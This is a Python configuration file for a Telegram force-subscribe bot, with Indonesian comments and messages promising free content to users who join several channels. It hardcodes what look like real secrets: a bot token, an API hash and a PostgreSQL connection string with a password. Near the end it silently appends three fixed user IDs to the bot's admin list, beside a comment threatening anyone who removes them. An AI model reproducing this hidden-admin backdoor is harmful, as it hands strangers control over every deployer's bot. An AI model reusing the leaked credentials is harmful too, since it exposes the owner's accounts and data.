import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6862246252:AAEH66LjDDOnBLdhUTZZgvG6kuF-9O4_v4k")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "28529939"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "0c75796d08f0d8372b4688e7520803af")

# ID Channel Database
CHANNEL_DB = int(os.environ.get("CHANNEL_DB", "-1002007735580"))

# Database
DATABASE_URL = os.environ.get("DATABASE_URL", "postgres://vwipnbqj:lk0lXKkEB-LhxmKdffZR5UREEe1uCSHw@rosie.db.elephantsql.com/vwipnbqj")

# NAMA OWNER
OWNER = os.environ.get("OWNER", "masgacoresmi")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "True"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "main")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_1 = int(os.environ.get("FORCE_SUB_1", "-1001908767450"))
FORCE_SUB_2 = int(os.environ.get("FORCE_SUB_2", "-1002048837838"))
FORCE_SUB_3 = int(os.environ.get("FORCE_SUB_3", "-1002000958858"))
FORCE_SUB_4 = int(os.environ.get("FORCE_SUB_4", "-1002042406787"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MESSAGE = os.environ.get(
    "START_MESSAGE",
    "<b><u>Hai Gacolers</u>, {first} {last}!"
    "\n\n"
    "✨ 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒏𝒅𝒂𝒑𝒂𝒕𝒌𝒂𝒏 𝑨𝒔𝒖𝒑𝒂𝒏 𝑮𝒓𝒂𝒕𝒊𝒔 𝑨𝒏𝒅𝒂 𝑯𝒂𝒓𝒖𝒔 𝑱𝒐𝒊𝒏 𝑻𝒆𝒓𝒍𝒆𝒃𝒊𝒉 𝑫𝒂𝒉𝒖𝒍𝒖 ✨\n"

    "👩‍💻 𝑱𝒊𝒌𝒂 𝑩𝒐𝒕 𝑴𝒂𝒕𝒊 𝒂𝒕𝒂𝒖 𝑩𝒆𝒓𝒌𝒆𝒏𝒅𝒂𝒍𝒂 𝑳𝒂𝒑𝒐𝒓 𝒌𝒆 <a href='https://bit.ly/gacolersmngc'>@mngcbot</a>.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "6112431168").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MESSAGE = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b><u>Hai Gacolers</u>, {first} {last}!"
    "\n\n"
    "✨ 𝑼𝒏𝒕𝒖𝒌 𝑴𝒆𝒏𝒅𝒂𝒑𝒂𝒕𝒌𝒂𝒏 𝑨𝒔𝒖𝒑𝒂𝒏 𝑮𝒓𝒂𝒕𝒊𝒔 𝑨𝒏𝒅𝒂 𝑯𝒂𝒓𝒖𝒔 𝑱𝒐𝒊𝒏 𝑻𝒆𝒓𝒍𝒆𝒃𝒊𝒉 𝑫𝒂𝒉𝒖𝒍𝒖."
    "\n\n"
    "✨ Silakan Klik Tombol <u>JOIN</u> di Bawah dan Selamat Menjadi Bagian dari <i><u>Gacolers Indonesia!</u></i>"
    "\n\n"
    "👩‍💻 𝑱𝒊𝒌𝒂 𝑩𝒐𝒕 𝑴𝒂𝒕𝒊 𝒂𝒕𝒂𝒖 𝑩𝒆𝒓𝒌𝒆𝒏𝒅𝒂𝒍𝒂 𝑳𝒂𝒑𝒐𝒓 𝒌𝒆 <a href='https://bit.ly/gacolersmngc'>@mngcbot</a>.</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "True"))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((1172067633, 5030620281, 6112431168))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
